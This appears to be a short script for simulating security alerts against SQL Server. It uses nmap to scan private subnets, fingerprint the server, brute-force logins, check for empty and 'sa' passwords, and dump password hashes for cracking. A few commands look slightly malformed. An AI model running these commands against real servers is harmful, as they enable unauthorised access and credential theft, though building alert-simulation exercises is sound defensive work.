### ---------------------------------------------------------------------------------
### ASC Alert simulation for SQL Server
### ---------------------------------------------------------------------------------

# 00 - Install SQL Server
    
# 01 - Make sure local firewall is allowing SQL connectivity on port 1433 (TCP + UDP)
    netsh advfirewall firewall add rule name = SQLPort dir = in protocol = tcp action = allow localport = 1433 remoteip = localsubnet profile = DOMAIN
    netsh advfirewall firewall add rule name = SQLPort2 dir = in protocol = udp action = allow localport = 1434 remoteip = localsubnet profile = DOMAIN

# 02 - Install Nmap

# 03 - Simulation exercise
    # TCP SCAN <iprange>
    nmap -p T:1433 -sV 172.24.224-230.1-254 -oG tcp_scan_results.txt
    # UDP SCAN <iprange>
    nmap -p U:1434 -sU -sV 172.24.224-230.1-254 -oG udp_scan_results.txt
    # Fingerprinting <targetip>
    nmap -p1433 --script ms-sql-info 172.20.129.57
    # Get DB tables <targetip>
    nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa 172.24.230.178
    # BruteForce <targetip>
    nmap -p1433 --script ms-sql-brute 172.20.129.57
    # BruteForce targeting specific db <targetip>
    nmap -p1433 –script ms-sql-brute –script-args userdb=./usernames.txt,passdb=./passlist.txt 172.20.129.57
    # Check for the existence of null passwords <targetip>
    nmap -p1433 --script ms-sql-empty-password 172.20.129.57
    # Check SA Access <targetip>
    nmap -p1433 --script ms-sql-hasdbaccess --script-args mssql.username=sa 172.24.230.178
    # Dump pwd hashes for cracking <targetip>
    nmap -p1433 --script ms-dump-hashes --script-args mssql.username=sa 172.24.230.178
